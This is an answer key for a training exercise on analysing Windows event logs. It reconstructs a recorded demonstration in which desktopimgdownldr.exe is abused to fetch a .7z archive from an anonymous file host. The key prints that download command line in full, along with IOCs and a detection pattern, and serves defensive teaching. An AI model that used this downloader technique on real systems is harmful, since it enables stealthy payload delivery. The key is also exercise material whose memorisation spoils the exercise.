# Case 14: Answer key (SPOILERS)

> Don't open this until your `report.md` is finished.

**Source:** EVTX-ATTACK-SAMPLES (sbousseaden), `sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx`. A researcher recorded it on a Microsoft Windows 10 test VM (`MSEDGEWIN10`, user `IEUser`) while demonstrating the technique, so there's no real victim. Treat it as real for the exercise.

## Survey

- **Sysmon:** 3 events: 2 × Event ID 1, 1 × Event ID 11. Records 305352–305356 with **305353 and 305355 missing**, so the export is partial.
- Host `MSEDGEWIN10`, user `MSEDGEWIN10\IEUser`, LogonId `0x89ccc`, session 1, Medium integrity. The file event (rec 305356) has no `User` field.
- `UtcTime` range: **08:47:20.001 → 08:47:21.485** on 2020-07-03, about 1.5 seconds.
- **No Event ID 3** (network connection) in the export at all.

## Process tree

```text
cmd.exe  (no arguments)   guid …EF3D…F3653401, PID 5384   [no process-create event]
└── cmd.exe  cmd /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr   PID 1932, rec 305352
    └── desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr                PID 4604, rec 305354

svchost.exe   guid …2178…AADA5800, PID 1556   [no process-create event; long-running service host]
└── [file] C:\Users\IEUser\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z   rec 305356
```

The `svchost.exe` is **not** a child of anything in the chain. It's a separate, already-running service host. Don't draw it under `desktopimgdownldr.exe`.

An open Command Prompt (no arguments) running a `cmd /c …` child fits a command being typed or pasted into a prompt, or a script that calls `cmd /c`. The data can't say which.

## The tool

| Field | Value |
|---|---|
| Image | `C:\Windows\System32\desktopimgdownldr.exe` |
| Company / OriginalFileName | `Microsoft Corporation` / `desktopimgdownldr.exe`: a genuine Windows binary |
| Real purpose | part of Windows **Personalization**: downloads lock-screen and desktop images for managed devices |
| Here | `/lockscreenurl:` points at **`https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z`**, a `.7z` archive whose name contains "Bin", not an image. `a.uguu.se` is a public, anonymous, short-lived file-hosting service. That's outside knowledge, not from the logs |

LOLBAS lists `desktopimgdownldr.exe` as a **downloader**: give it any URL and Windows fetches the file for you. **T1105** (Ingress Tool Transfer).

## The file event (rec 305356)

| UtcTime | Writer | TargetFilename | CreationUtcTime |
|---|---|---|---|
| 08:47:21.485 | `svchost.exe` (PID 1556) | `…\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z` | 08:47:21.485, the same, so a brand-new file |

- **Why svchost?** `desktopimgdownldr` doesn't download the file itself. It hands the job to the **Background Intelligent Transfer Service (BITS)**, which runs inside a `svchost.exe`. That's why the writer is a service host, not the process you ran. This is documented behaviour of the tool. The BITS job itself isn't in the data. **T1197** (BITS Jobs) fits as a *likely* mechanism. Mark it as inferred.
- **Why the user's Temp folder?** Without admin rights the tool can't write to the system Personalization folder or set the lock-screen policy, so the download lands in the user's own `%TEMP%`. The lock screen didn't change.

## Linking the file to the command

| Link | Observed or inferred |
|---|---|
| The file is in a `Personalization\LockScreenImage` folder named `LockScreenImage_…` | observed (path) |
| The extension `.7z` matches the URL's `.7z` | observed (both fields) |
| Written 1.4 s after the tool started | observed (timing) |
| In the same user's profile (`IEUser`) | observed (path) |
| BITS fetched it on the tool's behalf | inferred (documented behaviour, no BITS events) |
| Its contents are what the URL served | **inferred**: no network event, no hash, no proxy log |

Together that's a strong link, but only collecting the file (and ideally proxy or BITS logs) makes it certain.

## What happened (interpretation)

1. In an interactive session, someone or something ran `cmd /c desktopimgdownldr.exe /lockscreenurl:<URL to a .7z> …` (recs 305352, 305354).
2. A signed Windows image downloader was **abused to fetch an archive** from an anonymous file host. That's **T1105**, using a trusted binary that many tools don't watch.
3. About 1.4 s later, BITS (in `svchost.exe`) wrote a new `.7z` into the user's Temp Personalization folder (rec 305356). That's almost certainly the downloaded archive.
4. **Nothing in the export shows the archive being opened, extracted or run.** A `.7z` needs another program to unpack it. So the honest statement is "**downloaded, not shown to have executed**", within an export that's missing two records and has no network events.
5. **Malcolm's claim, tested:**
   - "No admin rights": **supported**. Medium integrity, and the file landed in the user's profile because the tool couldn't write to the system location.
   - "So nothing could have been installed": **misses the point**. Downloading needs no admin rights, and neither does running a program from the user's own folders. Many intrusions stay in user context for days. And the command line wasn't an accident: someone deliberately pointed a Windows utility at an archive on an anonymous file host.

## Timeline (UTC, 2020-07-03)

| Time | Rec | Event |
|---|---|---|
| before 08:47:20 | — | an interactive `cmd.exe` (PID 5384) is open. It's the parent in rec 305352 |
| 08:47:20.001 | 305352 | `cmd /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/…_Bin.7z …` |
| — | 305353 | **missing** |
| 08:47:20.055 | 305354 | `desktopimgdownldr.exe` starts |
| — | 305355 | **missing** |
| 08:47:21.485 | 305356 | `svchost.exe` writes `LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z` |

## Verdict

**True positive (malicious download), high confidence that a file was fetched, undetermined whether it was used.** No legitimate lock-screen job pulls a `.7z` from an anonymous file host through a hand-typed `cmd /c`. Escalate. Don't wipe yet. Collect first, so the decision is based on what the archive is.

## IOCs

- URL `https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z` (record it; don't visit it)
- File `C:\Users\IEUser\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z` (no hash in the logs: collect it)
- Pattern: `desktopimgdownldr.exe` with `/lockscreenurl:` pointing at anything that isn't the organisation's own image server, and files in `…\Personalization\LockScreenImage\` that aren't images
- The `Hashes` on `cmd.exe` and `desktopimgdownldr.exe` are **legitimate Windows binaries**. They aren't IOCs.

## What you can't conclude from this data

- What's inside the `.7z`, and whether it was extracted or run
- Its hash, or proof that it's byte-for-byte what the URL served
- What the two missing records (305353, 305355) were
- Who typed the command, or what opened the outer `cmd.exe`
- Whether there was network activity to other places (no Event ID 3 in the export)
- What happened after 08:47:21

## Good next steps (for your recommendations)

- **Preserve first:** collect the `.7z`, hash it, and analyse it in a sandbox. Pull the full Sysmon log (including the two missing records), the BITS Client Operational log, and proxy or firewall logs for `a.uguu.se`.
- **Contain proportionately:** disconnect the workstation from the network until the archive is understood. A wipe can wait for evidence, which answers Malcolm's concern.
- **Investigate:** look for anything that touched the `.7z` afterwards (7-Zip or Explorer extraction, new executables in the profile, new Run keys or scheduled tasks). Ask who was using the workstation at 08:47 and why a Command Prompt was open.
- **Scope:** hunt for `desktopimgdownldr.exe /lockscreenurl:` across clients, and for non-image files under `Personalization\LockScreenImage`.
- **Prevent:** alert on `desktopimgdownldr.exe` outside device-management contexts, and consider blocking anonymous file-hosting domains at the proxy.

*Score yourself with the rubric panel above the answer key in SENTINEL.*
